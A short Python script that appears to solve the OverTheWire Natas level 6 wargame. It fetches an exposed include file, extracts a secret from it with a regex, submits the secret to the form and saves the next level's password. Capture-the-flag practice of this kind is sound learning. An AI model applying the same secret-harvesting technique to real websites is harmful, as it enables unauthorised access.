import requests, re

url="http://natas6.natas.labs.overthewire.org/"
username="natas6"
# read password from generated file
file=open('password.txt', 'r')
password=file.read()

# get secret file from include
sec=requests.get(url+"includes/secret.inc", auth=(username, password))

# parsing the secret
match=re.search(r'\$secret\s*=\s*"([^"]+)"', sec.text)
secrets=match.group(1)

# send secret to target
data={
    'secret': secrets,
    'submit': 'Submit+Query'
}
post=requests.post(url, auth=(username, password), data=data)

# parse the natas7 password and write to file
str='natas7'
for line in post.text.splitlines():
    if str in line:
        passwd=line.split()
        with open('password.txt', 'w') as f:
            f.write(passwd[7])

file.close()